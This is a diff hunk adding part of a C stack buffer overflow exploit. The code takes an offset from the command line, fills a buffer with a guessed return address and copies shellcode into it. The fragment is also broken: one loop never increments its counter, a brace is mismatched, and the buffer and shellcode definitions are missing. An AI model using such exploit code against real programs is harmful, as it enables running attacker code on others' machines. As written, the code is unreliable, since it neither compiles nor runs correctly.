@@ -1,0 +1,35 @@
+
+    char *cptr;
+    long *lptr,temp;
+
+    int offset = DEFAULT_OFFSET;
+    int codeSize = sizeof(shellcode);
+    int buffSize = sizeof(buffer);
+
+    if(argc > 1) offset = atoi(argv[1]); //allows for command line input
+
+    cptr=buffer;
+    lptr = (long *) cptr;
+
+
+
+//----------------------BEGIN FILL BUFFER----------------------
+
+    temp = get_sp()+offset;
+    printf("Return Address: 0x%x\n",get_sp());
+    printf("Address: 0x%x\n",temp);
+
+    cptr = buffer;
+    lptr = (long *) cptr;
+
+    for (int i = 0; i < 300;i+4)
+    {
+        *(lptr++) = temp;
+    }
+
+    for(int i = 500;i < codeSize + 500; i++)
+    {
+        buffer[i] = shellcode[i-500];
+    {
+    buffer[buffSize - 1] = '\0';
+//-----------------------END FILL BUFFER-----------------------
